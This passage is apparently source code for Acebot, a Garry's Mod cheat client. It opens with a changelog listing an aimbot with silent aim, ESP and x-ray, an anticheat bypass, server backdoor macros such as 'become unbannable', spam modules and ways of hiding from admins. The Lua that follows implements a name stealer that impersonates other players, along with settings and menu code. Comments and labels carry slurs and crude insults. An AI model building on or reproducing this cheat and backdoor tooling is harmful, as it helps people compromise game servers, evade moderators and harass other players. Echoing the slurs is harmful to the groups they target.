    "Added m9k wallbang mode",

    "Added proper aimbot bind key mode",

    "Numerical variables now save properly between sessions",

    " ===== 1.05 (Mar 24 2017) ===== ",

    "Added more insult modes",

    "Added silent aim",

    "Added esp range slider",

    "Cleaned up aimbot core",

    "Added pattern matching to chat spammer",

    "Added clientside flashlight",

    " ===== 1.04 (Mar 12 2017) ===== ",

    "Added spread compensation to aimbot for xtreme accuracy",

    "Added ace_insult4",

    " ===== 1.03 (Feb 8 2017) ===== ",

    "Added more aegis debug commands",

    "Expanded insult generator",

    "Added wraith vision mode",

    "Added ace_exploit_rapeconsole",

    " ===== 1.02 (Feb 8 2017) ===== ",

    "Fixed 180up",

    "Fixed error that would occasionally happen and betray our presence to server admins",

    " ===== 1.01 (Nov 15 2016) ===== ",

    "Added /PM Spam mode",

    "Fixed innocent roleplayer printing a bunch of crap",

    "Added ace_insult3 and crash jackson macros",

    "Fixed TTT lua errors",

    " ===== 1.00 (Aug 30 2016) ===== ",

    "Finalized menu theme",

    "Added bhop basic auto strafe",

    "Added vote spammer module",

    "Changed namestealer to use the new odium lua API",

    "Added options for disabling squares and player names on the ESP",

    "Fixed rear vision mirror",

    " ===== 0.98 (Jul 29 2016) ===== ",

    "Added more insult fragments to ace_insult",

    "Added propkill visual settings",

    " ===== 0.97 (Jul 20 2016) ===== ",

    "Added entity scanner mode, allows you to gather advanced information and use bd macros directly on a target",

    "Added ace_innocent_roleplayer and ace_random_rpname for hiding from admins",

    "Backdoor CP now checks if backdoor is functional before a message is sent",

    "Namestealer should be more reliable now",

    "Better tooltips on some menu buttons",

    "More changes to backdoor CP",

    " ===== 0.96 (Jun 14 2016) ===== ",

    "Added more backdoor macros",

    "Added ace_180up_vertical_angle command for people who like to adjust their launch angles",

    " ===== 0.95 (Apr 22 2016) ===== ",

    "Improved backdoor macro menu with more macros and fixes for old ones",

    "Fixed ace_pk_180up not looking up",

    " ===== 0.94 (Mar 25 2016) ===== ",

    "Added support for the cw2 base for the inspect weapon menu",

    "Triggerbot now uses the same targeting logic as aimbot",

    "Further unfucked the aimbot and added more options",

    "Added damage hitmarker function to crosshair",

    "Fixed ab_init not being called, should fix the TTT traitor detector",

    "Added random insult mode to chat spammer",

    " ===== 0.93b (Mar 15 2016) ===== ",

    "Made ace_insult and ace_insult2 more savage",

    "Added a couple more macros to the entfinder",

    "Changed draw order so ESP draws over the top of xray",

    "Minor backend cleanup",

    " ===== 0.93 (Mar 11 2016) ===== ",

    "Added easy macros to the ent finder menu",

    "Fixed broken calcview hook",

    "Made aimbot refresh its target buffer when in fire only on snap mode",

    " ===== 0.92 (Mar 08 2016) ===== ",

    "Fixed a bunch of error spew",

    "Updated aegis detours system to detect anticheats and have proper logs",

    " ===== 0.91 (Mar 07 2016) ===== ",

    "Made chat spammer option always default to off and not get saved",

    "Added TTT traitor detection system (fucking finally)",

    "Got target highlighting system working",

    "Improved the fucked up aimbot a bit more",

    "Removed a bunch of bugged and unused options from the aimbot control panel",

    "Removed broken and dated minge alts system",

    " ===== 0.90 (Feb 26 2016) ===== ",

    "Lubed my anus for project odium",

    "Fixed the janky inspect weapon script and moved it to utilities",

    "Improved the acebot console with live updates and better logging",

    "Added chat spammer",

    " ===== 0.84b (Jan 28 2016) ===== ",

    "Minor system fixes, passing invalid players etc",

    " ===== 0.84a (Jan 23 2016) ===== ",

    "Removed inject SCI function since it's now built into wraithnet",

    "Improved headshot accuracy for aimbot",

    "Added the option to target heads or centre of mass for aimbot",

    "Added teleport, gas, become unbannable macros, extended range on most trace based macros",

    " ===== Alpha phase (June 2015 - Jan 2016) ===== ",

    "Acebot created, cac bypassed, many shitRP servers pooped on",

}



AB.Vars = AB.Vars or {}

AB.NumberVars = AB.NumberVars or {} -- need a seperate table here coz im a lazy cunt

AB.Buddies = AB.Buddies or {}

AB.Targets = AB.Targets or {}

AB.TheyHaveEyesEverywhere = AB.TheyHaveEyesEverywhere or {}

AB.Witnesses = AB.Witnesses or {}

AB.Debug = AB.Debug or {}

AB.MarkedEnts = AB.MarkedEnts or {}

AB.Traitors = AB.Traitors or {}

AB.RenderPanic = false

AB.NameStealName = "Garry :D"

AB.NameStealPlayer = LocalPlayer()

AB.CrossHairAlpha = 0

AB.ScrollDelta = 0 -- lets you set mouse wheel scroll from outside of createmove

AB.AimbotBone = "ValveBiped.Bip01_Head1"

AB.ViewAngle = Angle(0,0,0)

AB.AimbotTarget = game.GetWorld()

AB.AimbotPreviewTarget = -1

AB.HoldingProp = game.GetWorld()

AB.ChatSpamText = "@getodium"

AB.OPhysColor = Vector( GetConVarString( "cl_weaponcolor" ) ) or Vector( 1,1,1 )

AB.CurrentBase = 0

AB.BaseAreaSize = 10

AB.InternalFakeAngles = 0

AB.MemoryDebug = {

    ["hud"] = 0,

    ["logic"] = 0,

    ["aimbot"] = 0,

}

AB.Freecam = false

AB.FreecamCoordinates = { pos = Vector( 0, 0, 0 ), ang = Angle( 0, 0, 0 ) }



-- general settings

AB.Vars.Notifications = AB.Vars.Notifications or true



-- vision

AB.Vars.Vision = AB.Vars.Vision or true

AB.Vars.ShowESP = AB.Vars.ShowESP or true

AB.Vars.ShowDead = AB.Vars.ShowDead or false

AB.Vars.ShowHP = AB.Vars.ShowHP or false

AB.Vars.ShowFriends = AB.Vars.ShowFriends or true

AB.Vars.ShowTargets = AB.Vars.ShowTargets or true

AB.Vars.TeamColors = AB.Vars.TeamColors or false

AB.Vars.ShowRanks = AB.Vars.ShowRanks or true

AB.Vars.ShowTraitors = AB.Vars.ShowTraitors or true

AB.Vars.ShowDistance = AB.Vars.ShowDistance or false

AB.Vars.ESPProps = AB.Vars.ESPProps or false

AB.Vars.Entfinder = AB.Vars.Entfinder or false

AB.Vars.Vizlines = AB.Vars.Vizlines or false

AB.Vars.BoundingBox = AB.Vars.BoundingBox or false

AB.Vars.BoundingBox3d = AB.Vars.BoundingBox3d or false

AB.Vars.VSquares = AB.Vars.VSquares or true

AB.Vars.VNames = AB.Vars.VNames or true

AB.Vars.PKVelocity = AB.Vars.PKVelocity or false

AB.Vars.PKChams = AB.Vars.PKChams or false

AB.Vars.PKPropCam = AB.Vars.PKPropCam or false

AB.Vars.PKPropBeams = AB.Vars.PKPropBeams or false

AB.Vars.PKPlayerBeams = AB.Vars.PKPlayerBeams or false

AB.Vars.PKVerticalBeams = AB.Vars.PKVerticalBeams or false

AB.Vars.CSFlashlight = AB.Vars.CSFlashlight or false

AB.NumberVars.VisionDist = AB.NumberVars.VisionDist or 2000



-- utility



AB.Vars.CameraSpam = AB.Vars.CameraSpam or true

AB.Vars.FlashlightSpam = AB.Vars.FlashlightSpam or false

AB.Vars.NoRecoil = AB.Vars.NoRecoil or true



AB.Vars.WitnessDetector = AB.Vars.WitnessDetector or false

AB.Vars.Mirror = AB.Vars.Mirror or false

AB.Vars.Radar = AB.Vars.Radar or false

AB.Vars.RadarColors = AB.Vars.RadarColors or false

AB.Vars.Xray = AB.Vars.Xray or false

AB.Vars.Crosshair = AB.Vars.Crosshair or false

AB.Vars.NameStealer = false

AB.Vars.NotifyKills = AB.Vars.NotifyKills or false



AB.Vars.XrayPlayers = AB.Vars.XrayPlayers or true

AB.Vars.XrayProps = AB.Vars.XrayProps or true

AB.Vars.XrayEntfinder = AB.Vars.XrayEntfinder or false

AB.Vars.NoChamColours = AB.Vars.NoChamColours or true

AB.Vars.XraySolid = AB.Vars.XraySolid or false



AB.Vars.AutoAddSteamFriends = AB.Vars.AutoAddSteamFriends or true



AB.Vars.ChatSpam = false

AB.Vars.ChatSpamOOC = AB.Vars.ChatSpamOOC or false

AB.Vars.ChatSpamBind = AB.Vars.ChatSpamBind or false

AB.Vars.ChatSpamInsult = AB.Vars.ChatSpamInsult or false

AB.Vars.ChatSpamPM = AB.Vars.ChatSpamPM or false

AB.Vars.ChatSpamPMAdmins = AB.Vars.ChatSpamPMAdmins or false



AB.EntScanner = false

AB.EntScannerTab = {}

AB.EntScannerEnt = game.GetWorld()



AB.Vars.DemoteSpam = false

AB.Vars.WantedSpam = false

AB.Vars.ULXVotekickSpam = false

AB.Vars.ULXVotebanSpam = false



AB.Vars.KillTaunts = false

AB.Vars.DeathTaunts = false



AB.Vars.DodgeArrest = false

AB.Vars.NewLifeRule = false

AB.Vars.DontTouchMeThere = false



AB.Vars.KeypadJew = false

AB.Vars.FreecamControls = false



-- aimbot



AB.Vars.Aimbot = AB.Vars.Aimbot or false

AB.Vars.AimbotTargetMode = AB.Vars.AimbotTargetMode or true

AB.Vars.AutoShoot = AB.Vars.AutoShoot or false

AB.Vars.AutoTrigger = AB.Vars.AutoTrigger or false

AB.Vars.AimbotShootThroughWalls = AB.Vars.AimbotShootThroughWalls or false

AB.Vars.SnapOnFire = AB.Vars.SnapOnFire or false

AB.Vars.TargetFriends = AB.Vars.TargetFriends or true

AB.Vars.TargetHighlighted = AB.Vars.TargetHighlighted or true

AB.Vars.TargetNormies = AB.Vars.TargetNormies or true

AB.Vars.TargetAdmins = AB.Vars.TargetAdmins or true

AB.Vars.TargetSameTeam = AB.Vars.TargetSameTeam or true

AB.Vars.TargetNoclippers = AB.Vars.TargetNoclippers or true

AB.Vars.PreviewTarget = AB.Vars.PreviewTarget or true

AB.Vars.CompSpread = AB.Vars.CompSpread or false

AB.Vars.SilentAim = AB.Vars.SilentAim or false

AB.Vars.AimbotBindMode = AB.Vars.AimbotBindMode or false

AB.Vars.AimbotWallbanger = AB.Vars.AimbotWallbanger or false

AB.Vars.AimbotAdaptiveTarget = AB.Vars.AimbotAdaptiveTarget or false

AB.Vars.AimbotStickyLock = AB.Vars.AimbotStickyLock or true



AB.NumberVars.AimbotMaxFOV = AB.NumberVars.AimbotMaxFOV or 20

AB.NumberVars.AimbotDist = AB.NumberVars.AimbotDist or 200

AB.NumberVars.AimbotSmooth = AB.NumberVars.AimbotSmooth or 0

AB.NumberVars.PKRotateAngle = AB.NumberVars.PKRotateAngle or 30



AB.NumberVars.AimbotBindKey = AB.NumberVars.AimbotBindKey or 107



AB.NumberVars.FreecamForward = AB.NumberVars.FreecamForward or 50

AB.NumberVars.FreecamBack = AB.NumberVars.FreecamBack or 49

AB.NumberVars.FreecamLeft = AB.NumberVars.FreecamLeft or 41

AB.NumberVars.FreecamRight = AB.NumberVars.FreecamRight or 43

AB.NumberVars.FreecamUp = AB.NumberVars.FreecamUp or 45

AB.NumberVars.FreecamDown = AB.NumberVars.FreecamDown or 42



-- default menu and esp colours

AB.DefaultSchemes = {

    [1] = {"Spectral Blue", Color(205,205,255,255), Color(105,105,255,255)},

    [2] = {"Ocean Blue", Color(100,100,255,255), Color(50,50,155,255)},

    [3] = {"Sage Green", Color(100,250,100,255), Color(0,200,0,255)},

    [4] = {"Javelin Orange", Color(250,250,0,255), Color(250,150,0,255)},

    [5] = {"Predator Red", Color(255,0,0,255), Color(200,0,0,255)},

    [6] = {"Miami Pink", Color(255,0,255,255), Color(150,0,150,255)},

    [7] = {"Anus Brown", Color(125,0,0,255), Color(50,0,0,255)},

    [8] = {"Jungle Green", Color(50,150,50,255), Color(0,50,0,255)},

    [9] = {"Noir Grey", Color(150,150,150,255), Color(50,50,50,255)},

}



AB.DefaultScheme = Color(205,205,255,255)

AB.DefaultScheme2 = Color(80,80,255,255)

AB.Matinfo = {

    ["$basetexture"] = "models/debug/debugwhite",

    ["$model"]       = 1,

    ["$nocull"]      = 1,

    ["$ignorez"] = 1,

}



AB.Mat1 = (CreateMaterial( "abchams2", "VertexLitGeneric", AB.Matinfo )) 

AB.ColScheme = Vector(AB.DefaultScheme.r / 255, AB.DefaultScheme.g / 255, AB.DefaultScheme.b / 255)

AB.ColScheme2 = Vector(AB.DefaultScheme2.r / 255, AB.DefaultScheme2.g / 255, AB.DefaultScheme2.b / 255)



AB.NumberVars.ColorScheme = AB.NumberVars.ColorScheme or 1



-- herkz

AB.Vars.Aimbot = AB.Vars.Aimbot or false



AB.Vars.Autoclick = AB.Vars.Autoclick or false

AB.Vars.Bhop = AB.Vars.Bhop or false

AB.Vars.BhopAutostrafe = AB.Vars.BhopAutostrafe or false

AB.Vars.RopeStorm = AB.Vars.RopeStorm or false

AB.Vars.Triggerbot = AB.Vars.Triggerbot or false

AB.Vars.Thirdperson = AB.Vars.Thirdperson or false





AB.NumberVars.MirrorX = AB.NumberVars.MirrorX or 0

AB.NumberVars.MirrorY = AB.NumberVars.MirrorY or 0

AB.NumberVars.MirrorSize = AB.NumberVars.MirrorSize or 30

AB.NumberVars.MirrorAxis = AB.NumberVars.MirrorAxis or 0



AB.NumberVars.XrayDistance = AB.NumberVars.XrayDistance or 200

AB.NumberVars.TPSDistance = AB.NumberVars.TPSDistance or 100

AB.NumberVars.TPSOffset = AB.NumberVars.TPSOffset or 0



AB.NumberVars.RadarX = AB.NumberVars.RadarX or ScrW() - 280

AB.NumberVars.RadarY = AB.NumberVars.RadarY or 20

AB.NumberVars.RadarAlpha = AB.NumberVars.RadarAlpha or 255

AB.NumberVars.RadarSize = AB.NumberVars.RadarSize or 250

AB.NumberVars.RadarZoom = AB.NumberVars.RadarZoom or 50



/*

local plymeta = FindMetaTable( "Player" )

plymeta.ConCommand2 = plymeta.ConCommand2 or plymeta.ConCommand

function plymeta:ConCommand( command )

if command == "jpeg" and AB.Vars.CameraSpam then return else

return self:ConCommand2( command )

end

end

*/



local ncomponent = { color = Color( 205, 205, 255 ), name = "Acebot" }

function AB.ChatText( message, col, typ )

    typ = typ or 1

    if odium and odium.aegis then

        if col.r - ( col.g + col.b ) > 150 then typ = 4 end -- probably an error message

        if col.r == 255 and col.g == 205 and col.b == 205 then typ = 2 end

        if col.g >= (col.r + col.b) then typ = 3 end

        odium.aegis.Notify( ncomponent, typ, message )

    else

        chat.AddText( Color(195,205,255,255), "[Acebot] ", col, message )

    end

end





------------------------------------------------------------------------ACEBOT UTILITIES--------------------------------------------------------------------------------------



function AB.SetPlayerName( name )

    if !odium or !odium.player or !odium.player.SetName then

        AB.ChatText( "Odium main module not present or malfunctioning! Name changing will not work!", Color(255,100,0) )

        AB.Vars.NameStealer = false

        return 

    end 

    odium.player.SetName( name )

end



local nstries = 0

--local ninjacharacter = "⁮"

local ninjacharacter = "⁮"



function AB.NameStealer()

if !AB.Vars.NameStealer or !LocalPlayer():IsValid() then return end

if !AB.NameStealPlayer:IsValid() then AB.NameStealPlayer = LocalPlayer() end



-- set your name to a given string, unfucks bytefalls random malfunctions

if AB.NameStealName != LocalPlayer():Nick() and AB.NameStealPlayer == LocalPlayer() then

    nstries = nstries + 1

    AB.NameStealName = LocalPlayer():Nick() 

--    LocalPlayer():ConCommand( "odium_setname "..AB.NameStealName )

    AB.SetPlayerName( AB.NameStealName )

    if AB.NameStealName == LocalPlayer():Nick() then nstries = 0 end

end



local unfuckedname = string.Replace( AB.NameStealName, ninjacharacter, "" ) -- gotta clear the ninjas out so we can check if the namesteal worked properly



-- dank namestealerinos :^)

if AB.NameStealPlayer != LocalPlayer() and unfuckedname != AB.NameStealPlayer:Nick() then

    nstries = nstries + 1

    local theirname = AB.NameStealPlayer:Nick()

    local ipos = math.random(1, #theirname)

    local strname = theirname[ipos]

    local fixd = string.Replace(theirname, strname, strname..ninjacharacter )



    AB.NameStealName = fixd

    AB.SetPlayerName( fixd )

--    LocalPlayer():ConCommand( "odium_setname "..fixd )

    if AB.NameStealName == unfuckedname then nstries = 0 end

end



end

timer.Create("ab_namesteal", 1, 0, AB.NameStealer)



function AB.NameStealerShutoff()

steamworks.RequestPlayerInfo( LocalPlayer():SteamID64() )

timer.Simple( 0.5, function() AB.SetPlayerName(steamworks.GetPlayerName(LocalPlayer():SteamID64())) end)

AB.Vars.NameStealer = false

AB.NameStealName = LocalPlayer():Nick()

AB.NameStealPlayer = LocalPlayer()

if AB.Vars.Notifications then AB.ChatText( "Shut namestealer script down", Color(255,255,255) ) end

end



function AB.ManualNameSet( ply, cmd, args, argstr )

--    local n = ""

  --  for k, v in pairs( args ) do if k != 1 then n = n.." "..v else n = n..v end end

    AB.SetPlayerName( argstr )

end

concommand.Add( "odium_setname", AB.ManualNameSet )





function AB.SaveSettings()

local StringToWrite = ""

    for k, v in pairs(AB.Vars) do

        if( StringToWrite == "" ) then

            StringToWrite = k .. ";" .. tostring(v)

        else

            StringToWrite = StringToWrite .. "\n" .. k .. ";" .. tostring(v)

        end

    end

    StringToWrite = StringToWrite.."--NUMBERVARS--\n"

    for k, v in pairs(AB.NumberVars) do

        if( StringToWrite == "" ) then

            StringToWrite = k .. ";" .. tostring(v)

        else

            StringToWrite = StringToWrite .. "\n" .. k .. ";" .. tostring(v)

        end

    end

/*

if not file.IsDir("acebot", "DATA") then

   file.CreateDir("acebot")

end

*/

if file.IsDir("acebot", "DATA") then

    file.Delete( "acebot/settings.txt" ) 

    file.Delete( "acebot" ) 

end



file.Write( "acebot_settings.dat", StringToWrite )

end

concommand.Add("ace_save_settings", AB.SaveSettings)



function AB.LoadSettings()

/*

if not file.IsDir("acebot", "DATA") then

   file.CreateDir("acebot")

end

*/

if !file.Exists("acebot_settings.dat", "DATA") then AB.SaveSettings() return end



local TheFile = file.Read( "acebot_settings.dat", "DATA" )

local halves = string.Explode( "--NUMBERVARS--\n", TheFile )

if !halves[2] then file.Delete( "acebot_settings.dat" )

    AB.ChatText( "Invalid data file and/or data file is using an outdated format! type ace_save_settings into console to fix this", Color(255,205,205) )

    return 

end



TheFile = halves[1]

local DataPieces = string.Explode( "\n", TheFile )



for k, v in pairs( DataPieces ) do

    local TheLine = string.Explode( ";", v )

    AB.Vars[TheLine[1]] = tobool(TheLine[2])

end



TheFile = halves[2]

local DataPieces = string.Explode( "\n", TheFile )



for k, v in pairs( DataPieces ) do

    local TheLine = string.Explode( ";", v )

    AB.NumberVars[TheLine[1]] = tonumber(TheLine[2])

end



AB.Vars.NameStealer = false



end

concommand.Add("ace_load_settings", AB.LoadSettings)

AB.LoadSettings() -- load our shit right away

AB.Vars.ChatSpam = false -- reset this to false so we dont get cucked by anticheats



-- covert source units(inches) to metres

function AB.ToMetric( num )

if not isnumber(num) then return end

return math.floor(num * 0.0254)

end



-- check if an entity is actually visible on our screen, used to boost efficiency in the xray and esp code

function AB.OnScreen( ent, ws )

    local ws = ws or 0

    local bpos = (ent:LocalToWorld(ent:OBBCenter())):ToScreen()

    if ( bpos.x < (ScrW() + ws) and bpos.x > (0 - ws) and bpos.y < (ScrH() + ws) and bpos.y > (0 - ws) ) then return true end

    return false

end



function AB.IsDead( ply )

if !ply:IsValid() or !ply:Alive() or ply:GetObserverMode() != OBS_MODE_NONE then return true end

return false

end



-- compatible with ulx, assmod, evolve, vermillion 2 and traditional admin/superadmin detection may or may not pick up unknown admin mods

function AB.GetRank( ply )

if !ply or !ply:IsValid() then return "user" end

local rank = "user"

if ply:GetNWString("usergroup") then rank = ply:GetNWString("usergroup") return rank end

--if evolve then rank = ply:EV_GetRank() return rank end

if ply:GetNetworkedString( "UserGroup" ) then rank = ply:GetNetworkedString( "UserGroup" ) return rank end

if ply:GetNWString("Vermilion_Rank") then rank = ply:GetNWString("Vermilion_Rank") return rank end

if ply:IsSuperAdmin() then rank = "SUPERADMIN" return rank end

if ply:IsAdmin() then rank = "ADMIN" return rank end



return rank -- if they aren't any kind of admin that we know of then this will return "user"

end





function AB.GetESPColor( ply )

local col1, col2 = AB.DefaultScheme, AB.DefaultScheme2



if AB.IsTarget( ply ) then

    col1, col2 = Color(255,205,0,255), Color(205,160,0,255)

    return col1, col2

end



if AB.IsFriend( ply ) then

    col1, col2 = Color(0,255,0,255), Color(100,250,100,255)

    return col1, col2

end



if AB.GetRank( ply ) != "user" then

    col1, col2 = Color(255,100,0,255), Color(255,50,0,255)

    return col1, col2

end



if AB.Vars.TeamColors then

col1 = team.GetColor(ply:Team())

col2 = Color(math.Clamp(col1.r - 100, 0, 255), math.Clamp(col1.g - 100, 0, 255), math.Clamp(col1.b - 100, 0, 255), 255)

return col1, col2

end



return col1, col2

end





-- friends and targets system









function AB.AddTarget( ply )

    if !ply or !ply:IsValid() then return end

    if table.HasValue( AB.Targets, ply ) then return end

    table.insert( AB.Targets, ply )

    AB.DebugLog( "Added "..ply:Nick().." to your targets list", Color( 250, 150, 50) )

end



function AB.RemoveTarget( ply )

    if !ply or !ply:IsValid() then return end

    if not table.HasValue( AB.Targets, ply ) then AB.ChatText( ply:Nick().." isn't a target!", Color(255,205,205) ) return end

    table.RemoveByValue( AB.Targets, ply )

    AB.DebugLog( "Removed "..ply:Nick().." from your targets list", Color( 250, 150, 50) )

end



function AB.IsTarget( ply )

    if !ply or !ply:IsValid() then return false end

    return table.HasValue( AB.Targets, ply )

end







function AB.IsFriend( ply )

    if !ply or !ply:IsValid() then return false end

    return table.HasValue( AB.Buddies, ply )

end



function AB.AddFriend( ply )

    if !ply:IsValid() then return end

    if table.HasValue( AB.Buddies, ply ) then return end

    table.insert( AB.Buddies, ply )

    AB.DebugLog( "Added "..ply:Nick().." to your friends list", Color( 50, 250, 50) )

end



function AB.RemoveFriend( ply )

    if !ply:IsValid() then return end

    if not table.HasValue( AB.Buddies, ply ) then AB.ChatText( ply:Nick().." isn't on your friends list!", Color(255,205,205) ) return end

    table.RemoveByValue( AB.Buddies, ply )

    AB.DebugLog( "Removed "..ply:Nick().." from your friends list", Color( 50, 250, 50) )

end



function AB.RemoveInvalidFriends()

    for k, v in pairs(AB.Buddies) do

        if !v:IsValid() then table.remove( AB.Buddies, k ) end

    end

end



function AB.AddConnectedFriends()

    for k, v in pairs(player.GetAll()) do

        if v:GetFriendStatus() == "friend" then AB.AddFriend( v ) end

    end

end

concommand.Add("ace_refresh_friends", AB.AddConnectedFriends)

timer.Create( "ab_keep_friends_updated", 10, 0, AB.AddConnectedFriends )



gameevent.Listen( "player_spawn" )

hook.Add( "player_spawn", "addsteamfriends", function( data )

    local id = data.userid

    local ply =  player.GetByID( id )

    if !ply:IsValid() then return end

    if ply:GetFriendStatus() == "friend" and AB.Vars.AutoAddSteamFriends and !table.HasValue( AB.Buddies, ply ) then

        AB.AddFriend( ply )

    end

end )



-- this is for faggots that attempt to restrict ulx who



function AB.Who()

    local plys = player.GetAll()

    for k, v in pairs(plys) do

        if v:GetNWString("usergroup") then

            local col = Color( 150, 150, 200, 255 )

            if v:GetNWString("usergroup") != "user" then col = Color( 250, 200, 150, 255 ) end

            MsgC(col, v:GetName() .. string.rep("\t", math.Round(8 / #v:GetName())), v:GetNWString("usergroup").."\n")

        end

    end

end

concommand.Add("ace_who", AB.Who)



local grad = Material( "gui/gradient" )

local upgrad = Material( "gui/gradient_up" )

local downgrad = Material( "gui/gradient_down" )

local o_color1 = Color( 0, 0, 50, 255 )

local o_color2 = Color(155, 155, 155, 255)





function AB.ToggleVar( var, fancyname )

if AB.Vars[var] then

if AB.Vars.Notifications then AB.ChatText( "Disabled "..fancyname, Color(255,205,205) ) end

if string.find(var, "Xray") or var == "Vision" then AB.XrayShutoff() end -- need to run this function to properly unfuck things that have been xray'd

AB.Vars[var] = false

else

if AB.Vars.Notifications then AB.ChatText( "Enabled "..fancyname, Color(255,255,255) ) end

AB.Vars[var] = true

end

AB.SaveSettings()

end



for k, v in pairs(AB.Vars) do

    concommand.Add("ace_togglevar_"..string.lower(k), function() AB.ToggleVar( k, k ) end)

end





function AB.ChangeColorScheme( num )

if not isnumber(num) then return end

if num <= 0 or num > #AB.DefaultSchemes then print("I don't know how you fucked up this badly but you are trying to change to a colour scheme that doesn't exist!") return end

local c1 = AB.DefaultSchemes[num][2]

local c2 = AB.DefaultSchemes[num][3]



if AB.Vars.Notifications then AB.ChatText( "Changed colour scheme to "..AB.DefaultSchemes[num][1], c1 ) end

AB.DefaultScheme = c1

AB.DefaultScheme2 = c2

AB.ColScheme = Vector(c1.r / 255, c1.g / 255, c1.b / 255)

AB.ColScheme2 = Vector(c2.r / 255, c2.g / 255, c2.b / 255)



-- AB.NumberVars.ColorScheme = num -- done inside the button logic



end



function AB.MakeToggleButton( parent, x, y, btext, var, vartext, tooltip)

if !parent:IsValid() then return end



local TButton = vgui.Create( "DButton" )

TButton:SetParent( parent )  

TButton:SetPos( x, y )

TButton:SetText( btext )

TButton:SetTextColor( Color(255, 255, 255, 255) )

TButton:SetSize( 110, 25 )

if tooltip != nil then TButton:SetToolTip( tooltip ) end



TButton.Paint = function( self, w, h )

    surface.SetDrawColor( Color(60, 60, 90, 200) )

    TButton:SetText( btext )

    surface.DrawRect( 0, 0, w, h )

    surface.SetDrawColor( o_color1 )

    surface.SetMaterial( downgrad )

    surface.DrawTexturedRect( 0, 0, w, h/ 2 )



    if AB.Vars[var] then

        surface.SetDrawColor( Color(150, 250, 150, 255) )

    else

        surface.SetDrawColor( Color(100, 100, 100, 255) )

    end

    surface.DrawOutlinedRect( 0, 0, w, h )

end





TButton.DoClick = function()

AB.ToggleVar( var, vartext )

end



end



function AB.MakeFunctionButton( parent, x, y, btext, func, tooltip)

if !parent:IsValid() then return end



local TButton = vgui.Create( "DButton" )

TButton:SetParent( parent )  

TButton:SetPos( x, y )

TButton:SetText( btext )

TButton:SetTextColor( Color(255, 255, 255, 255) )

TButton:SetSize( 110, 25 )

if tooltip != nil then TButton:SetToolTip( tooltip ) end



TButton.Paint = function( self, w, h )

    surface.SetDrawColor( Color(60, 60, 90, 200) )

    TButton:SetText( btext )

    surface.DrawRect( 0, 0, w, h )

    surface.SetDrawColor( o_color1 )

    surface.SetMaterial( downgrad )

    surface.DrawTexturedRect( 0, 0, w, h/ 2 )



    surface.SetDrawColor( Color(100, 100, 100, 255) )

    surface.DrawOutlinedRect( 0, 0, w, h )

end





TButton.DoClick = function()

func()

end



end



function AB.MakeFloatingButton( x, y, btext, func)

local TButton = vgui.Create( "DButton" )

TButton:SetPos( x, y )

TButton:SetText( btext )

TButton:SetTextColor( Color(255, 255, 255, 255) )

TButton:SetSize( 110, 25 )



TButton.Paint = function( self, w, h )

    surface.SetDrawColor( Color(60, 60, 90, 200) )

    TButton:SetText( btext )

    surface.DrawRect( 0, 0, w, h )

    surface.SetDrawColor( Color(100, 100, 100, 255) )

    surface.DrawOutlinedRect( 0, 0, w, h )

end





TButton.DoClick = function()

func()

end

return TButton

end



function AB.MakeSlider( parent, x, y, length, text, min, max, var )

if !parent:IsValid() then return end



local sbg = vgui.Create( "DPanel" )

sbg:SetParent( parent )

sbg:SetPos( x, y )

sbg:SetSize( length, 25 )



sbg.Paint = function( self, w, h ) -- Paint function

    surface.SetDrawColor( 50, 50, 90, 255 )

    surface.DrawRect(0, 0, w, h )

    surface.SetDrawColor( o_color1 )

    surface.SetMaterial( downgrad )

    surface.DrawTexturedRect( 0, 0, w, h/ 2 )

    surface.SetDrawColor( 50, 50, 90, 255 )

    surface.DrawOutlinedRect(0, 0, w, h )



end



local NumSlider = vgui.Create( "DNumSlider", sbg )

NumSlider:SetPos( 10,-5 )

NumSlider:SetWide( length - 10 )

NumSlider:SetText( text )

NumSlider:SetMin( min )

NumSlider:SetMax( max )

NumSlider:SetValue( AB.NumberVars[var] )

NumSlider:SetDecimals( 0 )

NumSlider.OnValueChanged = function( panel, val ) AB.NumberVars[var] = math.floor(val) end



end



function AB.MakeKeyBinder( parent, x, y, length, height, keyvar, changetxt )



local binder = vgui.Create( "DBinder", parent )

binder:SetSize( length, height )

binder:SetPos( x, y )

binder:SetTextColor( Color(255,255,255) )

binder:SetSelected( AB.NumberVars[keyvar] )

binder.Paint = function( self, w, h )

    surface.SetDrawColor( Color(60, 60, 90, 200) )

    surface.DrawRect( 0, 0, w, h )

    surface.SetDrawColor( o_color1 )

    surface.SetMaterial( downgrad )

    surface.DrawTexturedRect( 0, 0, w, h/ 2 )



    surface.SetDrawColor( Color(100, 100, 100, 255) )

    surface.DrawOutlinedRect( 0, 0, w, h )

end

function binder:SetSelectedNumber( num )

    AB.ChatText( "Set new "..changetxt.." bind key", Color(255,255,255) )

    self.m_iSelectedNumber = num

    AB.NumberVars[keyvar] = num

end



end



------------------------------------------------------------------------ACEBOT MENU--------------------------------------------------------------------------------------





function AB.Menu()



if AceMenu then return false end



local AceMenu = vgui.Create("DFrame")

AceMenu:SetSize(500,700)

AceMenu:SetTitle("Acebot - A component of Project Odium                    Created by LegendofRobbo")

AceMenu:Center()

AceMenu:MakePopup()



AceMenu.Paint = function( panel, w, h )



surface.SetDrawColor( Color(50, 50, 90, 255) )

surface.DrawRect( 0, 0, w, h )



surface.SetDrawColor( o_color1 )

surface.SetMaterial( upgrad )

surface.DrawTexturedRect( 0, h / 2, w, h / 2 )



surface.SetDrawColor( o_color1 )

surface.SetMaterial( downgrad )

surface.DrawTexturedRect( 0, 0, w, h/ 2 )



surface.SetDrawColor( o_color2 )

surface.DrawOutlinedRect( 0, 0, w, h )

surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )

end





local PropertySheet = vgui.Create( "DPropertySheet" )

PropertySheet:SetParent( AceMenu )

PropertySheet:SetPos( 10, 30 )

PropertySheet:SetSize( 480, AceMenu:GetTall() - 40 )



PropertySheet.Paint = function()

    surface.SetDrawColor( Color(0, 0, 0, 200) )

    surface.DrawRect(0, 0, PropertySheet:GetWide(), PropertySheet:GetTall())

    for k, v in pairs(PropertySheet.Items) do

       if v.Tab then

           v.Tab.Paint = function(self,w,h)

              draw.RoundedBox(0, 0, 0, w, h, Color(50,90,120))

           end

        end

    end

end





--------------------------------------------Tabs-------------------------------------------





local General = vgui.Create( "DPanel" )

General:SetPos( 0, 0 )

General:SetSize( 480, AceMenu:GetTall() - 40 )



General.Paint = function() -- Paint function

    surface.SetDrawColor(50, 50, 50 ,255)

    surface.DrawOutlinedRect(0, 0, General:GetWide(), General:GetTall())

    surface.SetDrawColor(0, 0, 0 ,200)

